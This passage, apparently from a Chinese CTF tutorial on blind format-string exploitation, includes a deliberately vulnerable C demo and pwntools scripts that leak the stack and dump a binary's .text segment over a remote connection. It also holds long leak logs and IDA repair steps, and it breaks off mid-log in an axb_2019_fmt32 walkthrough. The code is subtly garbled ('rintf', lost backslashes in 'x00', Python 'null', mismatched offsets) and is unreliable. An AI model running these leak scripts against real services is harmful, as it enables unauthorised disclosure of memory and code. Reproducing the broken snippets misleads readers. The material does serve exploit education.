<h6 id="那么当EIP指向0x4008A1时，程序事实上将会执行pop-rsi-pop-r15-ret-。"><a href="#那么当EIP指向0x4008A1时，程序事实上将会执行pop-rsi-pop-r15-ret-。" class="headerlink" title="那么当EIP指向0x4008A1时，程序事实上将会执行pop rsi;pop r15;ret;。"></a>那么当EIP指向0x4008A1时，程序事实上将会执行<code>pop rsi;pop r15;ret;</code>。</h6><h2 id="0x03-利用格式化字符串漏洞泄漏整个二进制文件"><a href="#0x03-利用格式化字符串漏洞泄漏整个二进制文件" class="headerlink" title="0x03 利用格式化字符串漏洞泄漏整个二进制文件"></a>0x03 利用格式化字符串漏洞泄漏整个二进制文件</h2><h3 id="原理简述"><a href="#原理简述" class="headerlink" title="原理简述"></a>原理简述</h3><p>格式化字符串的原理本文不再赘述，对于泄漏文件，我们常用的几个格式化控制符为：</p>
<ol>
<li>%N$p：以16进制的格式输出位于printf第N个参数位置的值；</li>
<li>%N$s：以printf第N个参数位置的值为地址，输出这个地址指向的字符串的内容；</li>
<li>%N$n：以printf第N个参数位置的值为地址，将输出过的字符数量的值写入这个地址中，对于32位elf而言，%n是写入4个字节，%hn是写入2个字节，%hhn是写入一个字节；</li>
<li>%Nc：输出N个字符，这个可以配合%N$n使用，达到任意地址任意值写入的目的。</li>
</ol>
<h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p><strong>漏洞环境搭建</strong></p>
<p>以下为Demo源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//blind_pwn_printf_demo.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;  </span><br><span class="line">        read(STDIN_FILENO, buf, <span class="number">100</span>);</span><br><span class="line">        rintf(buf);</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -z execstack -fno-stack-protector -no-pie -o blind_pwn_printf_demo_x64 blind_pwn_printf_demo.c</span></span><br><span class="line"><span class="comment">//gcc -z execstack -fno-stack-protector -no-pie -m32 -o blind_pwn_printf_demo_x32 blind_pwn_printf_demo.c</span></span><br></pre></td></tr></table></figure>
<p>此处我们不再启用服务器，直接用process加载本地文件，试图泄漏出文件副本。</p>
<p><strong>Leak Stack &amp; Where is <code>.text</code></strong></p>
<p>这里我们使用<code>%n$p</code>来循环泄漏<code>Stack</code>数据，此处我们先泄露400byte的stack data。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">where_is_start</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        payload = <span class="string">&#x27;%%%d$p.TMP&#x27;</span> % (i)</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        val = sh.recvuntil(<span class="string">&#x27;.TMP&#x27;</span>)</span><br><span class="line">        log.info(<span class="built_in">str</span>(i*<span class="number">4</span>)+<span class="string">&#x27; &#x27;</span>+val.strip().ljust(<span class="number">10</span>))</span><br><span class="line">        sh.recvrepeat(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure>
<p>⚠：此处<code>%%=%</code>、<code>%d=i</code>、x32下每次泄漏4字节，因此有<code>ix4</code>。</p>
<p>Leak result:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">[*] 0 %0$p.TMP  </span><br><span class="line">[*] 4 0xffd64ccc.TMP</span><br><span class="line">[*] 8 0x64.TMP  </span><br><span class="line">[*] 12 0xf7e006bb.TMP</span><br><span class="line">[*] 16 0xffd64cee.TMP</span><br><span class="line">[*] 20 0xffd64dec.TMP</span><br><span class="line">[*] 24 0xe0.TMP  </span><br><span class="line">[*] 28 0x70243725.TMP</span><br><span class="line">[*] 32 0x504d542e.TMP</span><br><span class="line">[*] 36 0xf7f6990a.TMP</span><br><span class="line">[*] 40 0xffd64cf0.TMP</span><br><span class="line">[*] 44 0x80482d5.TMP</span><br><span class="line">[*] 48 (nil).TMP </span><br><span class="line">[*] 52 0xffd64d84.TMP</span><br><span class="line">[*] 56 0xf7f22000.TMP</span><br><span class="line">[*] 60 0x6f17.TMP</span><br><span class="line">[*] 64 0xffffffff.TMP</span><br><span class="line">[*] 68 0x2f.TMP  </span><br><span class="line">[*] 72 0xf7d7cdc8.TMP</span><br><span class="line">[*] 76 0xf7f3f1b0.TMP</span><br><span class="line">[*] 80 0x8000.TMP</span><br><span class="line">[*] 84 0xf7f22000.TMP</span><br><span class="line">[*] 88 0xf7f20244.TMP</span><br><span class="line">[*] 92 0xf7d880ec.TMP</span><br><span class="line">[*] 96 0x1.TMP   </span><br><span class="line">[*] 100 0x1.TMP   </span><br><span class="line">[*] 104 0xf7d9ea50.TMP</span><br><span class="line">[*] 108 0x80485eb.TMP</span><br><span class="line">[*] 112 0x1.TMP   </span><br><span class="line">[*] 116 0xffd64de4.TMP</span><br><span class="line">[*] 120 0xffd64dec.TMP</span><br><span class="line">[*] 124 0x80485c1.TMP</span><br><span class="line">[*] 128 0xf7f223dc.TMP</span><br><span class="line">[*] 132 0xffd64d50.TMP</span><br><span class="line">[*] 136 (nil).TMP </span><br><span class="line">[*] 140 0xf7d88637.TMP</span><br><span class="line">[*] 144 0xf7f22000.TMP</span><br><span class="line">[*] 148 0xf7f22000.TMP</span><br><span class="line">[*] 152 (nil).TMP </span><br><span class="line">[*] 156 0xf7d88637.TMP</span><br><span class="line">[*] 160 0x1.TMP   </span><br><span class="line">[*] 164 0xffd64de4.TMP</span><br><span class="line">[*] 168 0xffd64dec.TMP</span><br><span class="line">[*] 172 (nil).TMP </span><br><span class="line">[*] 176 (nil).TMP </span><br><span class="line">[*] 180 (nil).TMP </span><br><span class="line">[*] 184 0xf7f22000.TMP</span><br><span class="line">[*] 188 0xf7f69c04.TMP</span><br><span class="line">[*] 192 0xf7f69000.TMP</span><br><span class="line">[*] 196 (nil).TMP </span><br><span class="line">[*] 200 0xf7f22000.TMP</span><br><span class="line">[*] 204 0xf7f22000.TMP</span><br><span class="line">[*] 208 (nil).TMP </span><br><span class="line">[*] 212 0xc2983082.TMP</span><br><span class="line">[*] 216 0xdf097e92.TMP</span><br><span class="line">[*] 220 (nil).TMP </span><br><span class="line">[*] 224 (nil).TMP </span><br><span class="line">[*] 228 (nil).TMP </span><br><span class="line">[*] 232 0x1.TMP   </span><br><span class="line">[*] 236 0x8048420.TMP</span><br><span class="line">[*] 240 (nil).TMP </span><br><span class="line">[*] 244 0xf7f5a010.TMP</span><br><span class="line">[*] 248 0xf7f54880.TMP</span><br><span class="line">[*] 252 0xf7f69000.TMP</span><br><span class="line">[*] 256 0x1.TMP   </span><br><span class="line">[*] 260 0x8048420.TMP</span><br><span class="line">[*] 264 (nil).TMP </span><br><span class="line">[*] 268 0x8048441.TMP</span><br><span class="line">[*] 272 0x804851b.TMP</span><br><span class="line">[*] 276 0x1.TMP   </span><br><span class="line">[*] 280 0xffd64de4.TMP</span><br><span class="line">[*] 284 0x80485a0.TMP</span><br><span class="line">[*] 288 0x8048600.TMP</span><br><span class="line">[*] 292 0xf7f54880.TMP</span><br><span class="line">[*] 296 0xffd64ddc.TMP</span><br><span class="line">[*] 300 0xf7f69918.TMP</span><br><span class="line">[*] 304 0x1.TMP   </span><br><span class="line">[*] 308 0xffd66246.TMP</span><br><span class="line">[*] 312 (nil).TMP </span><br><span class="line">[*] 316 0xffd66262.TMP</span><br><span class="line">[*] 320 0xffd66283.TMP</span><br><span class="line">[*] 324 0xffd662b7.TMP</span><br><span class="line">[*] 328 0xffd662e3.TMP</span><br><span class="line">[*] 332 0xffd66303.TMP</span><br><span class="line">[*] 336 0xffd66318.TMP</span><br><span class="line">[*] 340 0xffd6632a.TMP</span><br><span class="line">[*] 344 0xffd6633b.TMP</span><br><span class="line">[*] 348 0xffd66349.TMP</span><br><span class="line">[*] 352 0xffd663de.TMP</span><br><span class="line">[*] 356 0xffd663e9.TMP</span><br><span class="line">[*] 360 0xffd66400.TMP</span><br><span class="line">[*] 364 0xffd6640b.TMP</span><br><span class="line">[*] 368 0xffd6641c.TMP</span><br><span class="line">[*] 372 0xffd66430.TMP</span><br><span class="line">[*] 376 0xffd66440.TMP</span><br><span class="line">[*] 380 0xffd6647a.TMP</span><br><span class="line">[*] 384 0xffd664a0.TMP</span><br><span class="line">[*] 388 0xffd664af.TMP</span><br><span class="line">[*] 392 0xffd66501.TMP</span><br><span class="line">[*] 396 0xffd66509.TMP</span><br></pre></td></tr></table></figure>
<p>我们希望能从泄露的数据中获取<code>_start</code>函数的地址，而<code>_start</code>函数正是<code>.text</code>(代码段)的起始地址。</p>
<p>此处我们发现了在泄露序号为236和260的位置出现了相同的明显位于<code>.text</code>段中的相同地址，这就是<code>_start</code>函数的地址。</p>
<p><strong>Dump <code>.text</code></strong></p>
<p>首先，我们需要先确定我们的格式化字符串位置，再利用格式化字符串漏洞中的任意地址读漏洞来dump整个<code>.text</code>段。</p>
<p>已知我们输入的字符串一定是<code>%N$p</code>，转换成十六进制就是<code>0x25??2470</code>，由于数据在内存中是逆序存储的，很容易可以发现，当<code>N=7</code>时，回显的是<code>[*] 28 0x70243725.TMP</code>，也就是说，我们接下来要使用<code>%8$s+addr</code>的格式化控制符来泄露代码段数据。</p>
<p>⚠此处注意：%s进行输出时实际上是x00截断的，但是.text段中不可避免会出现x00，但是我们注意到还有一个特性，如果对一个x00的地址进行leak，返回是没有结果的，因此如果返回没有结果，我们就可以确定这个地址的值为x00，所以可以设置为x00然后将地址加1进行dump。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump_text</span>(<span class="params">start_addr=<span class="number">0</span></span>):</span></span><br><span class="line">    text_segment=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            payload = <span class="string">&#x27;Leak---&gt;%11$s&lt;-|&#x27;</span>+p32(start_addr)</span><br><span class="line">            sh.sendline(payload)</span><br><span class="line">            sh.recvuntil(<span class="string">&#x27;Leak---&gt;&#x27;</span>)</span><br><span class="line">            value = sh.recvuntil(<span class="string">&#x27;&lt;-|&#x27;</span>).strip(<span class="string">&#x27;&lt;-|&#x27;</span>)</span><br><span class="line">            text_segment += value</span><br><span class="line">            start_addr += <span class="built_in">len</span>(value)</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">len</span>(value)==<span class="number">0</span>):</span><br><span class="line">                text_segment += <span class="string">&#x27;x00&#x27;</span></span><br><span class="line">                start_addr += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span>(text_segment[-<span class="number">9</span>:-<span class="number">1</span>]==<span class="string">&#x27;x00&#x27;</span>*<span class="number">8</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        log.info(<span class="string">&#x27;We get &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(text_segment)) +<span class="string">&#x27;byte file!&#x27;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;blind_pwn_printf_demo_x32_dump&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fout:</span><br><span class="line">            fout.write(text_segment)</span><br></pre></td></tr></table></figure>
<p>接下来我们使用IDA对我们Dump出的文件进行分析</p>
<p>⚠：如果分析结果与理论结果不同，请将dump文件与正确文件进行逐字节比对！</p>
<p><strong>IDA文件修复</strong></p>
<p><a target="_blank" rel="noopener" href="https://p2.ssl.qhimg.com/dm/1024_819_/t011eb0a825fa340244.png"><img src="%E7%9B%B2%E6%89%93/t011eb0a825fa340244.png" alt="img"></a></p>
<p>我们知道，因为是我们dump出的文件，因此IDA无法识别它的文件类型，我们直接加载为<code>Binary File</code>。</p>
<p>此处我们已经获知了<code>.text</code>段的偏移，于是我们加入这个offset。</p>
<p><a target="_blank" rel="noopener" href="https://p1.ssl.qhimg.com/dm/1024_819_/t01b19581224a9f9ad9.png"><img src="%E7%9B%B2%E6%89%93/t01b19581224a9f9ad9.png" alt="img"></a></p>
<p>我们发现默认情形下程序就为我们分析出了三个函数。</p>
<p><a target="_blank" rel="noopener" href="https://p3.ssl.qhimg.com/dm/1024_640_/t01a9fb2f2ab2e7225f.png"><img src="%E7%9B%B2%E6%89%93/t01a9fb2f2ab2e7225f.png" alt="img"></a></p>
<p>但我们显然知道我们的<code>.text</code>段起始即为<code>_start</code>函数，于是我们手动强制分析其为函数。</p>
<p><a target="_blank" rel="noopener" href="https://p3.ssl.qhimg.com/dm/1024_721_/t013cfce17b52c9b010.png"><img src="%E7%9B%B2%E6%89%93/t013cfce17b52c9b010.png" alt="img"></a></p>
<p>此处我们需要引入关于程序启动的实现说明。</p>
<p><a target="_blank" rel="noopener" href="https://p5.ssl.qhimg.com/t01e124e9ca67fabca3.png"><img src="%E7%9B%B2%E6%89%93/t01e124e9ca67fabca3.png" alt="img"></a></p>
<p>可以看出，<code>_start</code>函数将会调用<code>__libc_start_main</code>函数，而该函数并不在<code>.text</code>段中，因此我们无法对其进行分析。具体的<code>_start</code>函数放在了前置知识一栏。也就是此处几个压栈操作压入了main函数的地址，紧接着程序调用的是<code>__libc_start_main</code>函数，那么显然0x080483F0处的函数为<code>__libc_start_main</code>函数，0x804851B的函数为<code>main()</code>函数。跟进分析<code>main()</code>,发现自动分析的汇编码非常混乱，于是使用重定义函数的方法予以解决，首先取消所有函数的定义，然后在00x804851B处再次定义函数。</p>
<p><a target="_blank" rel="noopener" href="https://p0.ssl.qhimg.com/dm/939_1024_/t0156cd608217988506.png"><img src="%E7%9B%B2%E6%89%93/t0156cd608217988506.png" alt="img"></a></p>
<p>F5查看反编译码</p>
<p><a target="_blank" rel="noopener" href="https://p5.ssl.qhimg.com/dm/1024_349_/t01ab1baf241dff2b2a.png"><img src="%E7%9B%B2%E6%89%93/t01ab1baf241dff2b2a.png" alt="img"></a></p>
<p>我们至少能够从参数列表推测出<code>read</code>和<code>printf</code>函数，对于缓冲区比较熟悉的话也能看出<code>setbuf</code>、<code>stdin</code>、<code>stdout</code>和<code>stderr</code>。</p>
<p>也就是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">read@plt:0x80483D0</span><br><span class="line">printf@plt:0x80483E0</span><br><span class="line">setbuf@plt:0x80483C0</span><br></pre></td></tr></table></figure>
<p>利用劫持got的方式劫持EIP或者利用stack overflow的方式劫持EIP的具体操作不再赘述。</p>
<p><strong>最终Leak脚本</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    sh = remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(<span class="string">&quot;./blind_pwn_printf_demo_x32&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">where_is_start</span>(<span class="params">ret_index=null</span>):</span></span><br><span class="line">    return_addr=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        payload = <span class="string">&#x27;%%%d$p.TMP&#x27;</span> % (i)</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        val = sh.recvuntil(<span class="string">&#x27;.TMP&#x27;</span>)</span><br><span class="line">        log.info(<span class="built_in">str</span>(i*<span class="number">4</span>)+<span class="string">&#x27; &#x27;</span>+val.strip().ljust(<span class="number">10</span>))</span><br><span class="line">        <span class="keyword">if</span>(i*<span class="number">4</span>==ret_index):</span><br><span class="line">            return_addr=<span class="built_in">int</span>(val.strip(<span class="string">&#x27;.TMP&#x27;</span>).ljust(<span class="number">10</span>)[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">return</span> return_addr</span><br><span class="line">        sh.recvrepeat(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump_text</span>(<span class="params">start_addr=<span class="number">0</span></span>):</span></span><br><span class="line">    text_segment=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            payload = <span class="string">&#x27;Leak---&gt;%11$s&lt;-|&#x27;</span>+p32(start_addr)</span><br><span class="line">            sh.sendline(payload)</span><br><span class="line">            sh.recvuntil(<span class="string">&#x27;Leak---&gt;&#x27;</span>)</span><br><span class="line">            value = sh.recvuntil(<span class="string">&#x27;&lt;-|&#x27;</span>).strip(<span class="string">&#x27;&lt;-|&#x27;</span>)</span><br><span class="line">            text_segment += value</span><br><span class="line">            start_addr += <span class="built_in">len</span>(value)</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">len</span>(value)==<span class="number">0</span>):</span><br><span class="line">                text_segment += <span class="string">&#x27;x00&#x27;</span></span><br><span class="line">                start_addr += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span>(text_segment[-<span class="number">9</span>:-<span class="number">1</span>]==<span class="string">&#x27;x00&#x27;</span>*<span class="number">8</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        log.info(<span class="string">&#x27;We get &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(text_segment)) +<span class="string">&#x27;byte file!&#x27;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;blind_pwn_printf_demo_x32_dump&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fout:</span><br><span class="line">            fout.write(text_segment)</span><br><span class="line"></span><br><span class="line">start_addr=where_is_start()</span><br><span class="line">dump_text(start_addr)</span><br></pre></td></tr></table></figure>
<p>使用方法：首先注释<code>dump_text</code>函数，查看<code>leak</code>结果，并确定<code>_start</code>函数位置，将位置填入<code>where_is_start()</code>的参数区域，解除<code>dump_text</code>函数的注释。</p>
<h3 id="以axb-2019-fmt32为例"><a href="#以axb-2019-fmt32为例" class="headerlink" title="以axb_2019_fmt32为例"></a>以axb_2019_fmt32为例</h3><p>⚠：本题目在BUUOJ上已被搭建，但是题目给出了源文件，原题为盲打题目，此处也只利用nc接口解题。</p>
<p><strong>Leak Stack &amp; Where is <code>.text</code></strong></p>
<p>这里泄露的数据中出现了大量的<code>(nil)</code>，重复部分已被隐去。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">[*] 0 %0$p      </span><br><span class="line">[*] 4 0x804888d </span><br><span class="line">[*] 8 0xff8e45ef</span><br><span class="line">[*] 12 0xf7f4d53c</span><br><span class="line">[*] 16 0xff8e45f8</span><br><span class="line">[*] 20 0xf7f295c5</span><br><span class="line">[*] 24 0x13      </span><br><span class="line">[*] 28 0x258e46e4</span><br><span class="line">[*] 32 0x3c702438</span><br><span class="line">[*] 36 0xa7c2d2d </span><br><span class="line">[*] 40 0xa       </span><br><span class="line">[*] 44 (nil)     </span><br><span class="line">....... (nil)       </span><br><span class="line">[*] 284 (nil)     </span><br><span class="line">[*] 288 0x65706552</span><br><span class="line">[*] 292 0x72657461</span><br><span class="line">[*] 296 0x3437253a</span><br><span class="line">[*] 300 0x2d3c7024</span><br><span class="line">[*] 304 0xa0a7c2d </span><br><span class="line">[*] 308 (nil)     </span><br><span class="line">....... (nil)    </span><br><span class="line">[*] 584 (nil)     </span><br><span class="line">[*] 588 0xb9008800</span><br><span class="line">[*] 592 0xf7f1b3dc</span><br><span class="line">[*] 596 0xff8e4840</span><br><span class="line">[*] 600 (nil)     </span><br><span class="line">[*] 604 0xf7d83637</span><br><span class="line">[*] 608 0xf7f1b000</span><br><span class="line">[*] 612 0xf7f1b000</span><br><span class="line">[*] 616 (nil)     </span><br><span class="line">[*] 620 0xf7d83637</span><br><span class="line">[*] 624 0x1       </span><br><span class="line">[*] 628 0xff8e48d4</span><br><span class="line">[*] 632 0xff8e48dc</span><br><span class="line">[*] 636 (nil)     </span><br><span class="line">[*] 640 (nil)     </span><br><span class="line">[*] 644 (nil)     </span><br><span class="line">[*] 648 0xf7f1b000</span><br><span class="line">[*] 652 0xf7f4dc04</span><br><span class="line">[*] 656 0xf7f4d000</span><br><span class="line">[*] 660 (nil)     </span><br><span class="line">[*] 664 0xf7f1b000</span><br><span class="line">[*] 668 0xf7f1b000</span><br><span class="line">[*] 672 (nil)     </span><br><span class="line">[*] 676 0x7d0c2af6</span><br><span class="line">[*] 680 0xd1f744e6</span><br><span class="line">[*] 684 (nil)     </span><br><span class="line">[*] 688 (nil)     </span><br><span class="line">[*] 692 (nil)     </span><br><span class="line">[*] 696 0x1       </span><br><span class="line">[*] 700 0x8048500 </span><br><span class="line">[*] 704 (nil)     </span><br><span class="line">[*] 708 0xf7f3dff0</span><br><span class="line">[*] 712 0xf7f38880</span><br><span class="line">[*] 716 